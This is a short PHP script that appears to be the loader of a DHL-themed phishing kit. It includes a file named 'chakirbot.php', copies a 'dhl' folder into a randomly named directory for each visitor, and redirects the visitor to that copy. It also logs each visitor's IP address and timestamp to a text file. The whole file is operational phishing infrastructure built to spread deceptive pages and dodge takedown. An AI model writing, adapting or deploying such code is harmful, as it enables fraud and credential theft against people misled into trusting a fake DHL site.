<?php


error_reporting(E_ALL);
ini_set('display_errors', 1);
include('chakirbot.php');

$DIR=md5(rand(0,100000000000));

function recurse_copy($home,$DIR) {

$dir = opendir($home);

@mkdir($DIR);

while(false !== ( $file = readdir($dir)) ) {

if (( $file != '.' ) && ( $file != '..' )) {

if ( is_dir($home . '/' . $file) ) {

recurse_copy($home . '/' . $file,$DIR . '/' . $file);

}

else {

copy($home . '/' . $file,$DIR . '/' . $file);

}

}

}

closedir($dir);

}

$home="dhl";

recurse_copy( $home, $DIR );

header("location:$DIR");

$ip = getenv("REMOTE_ADDR");

$file = fopen("vu.txt","a");

fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

?> 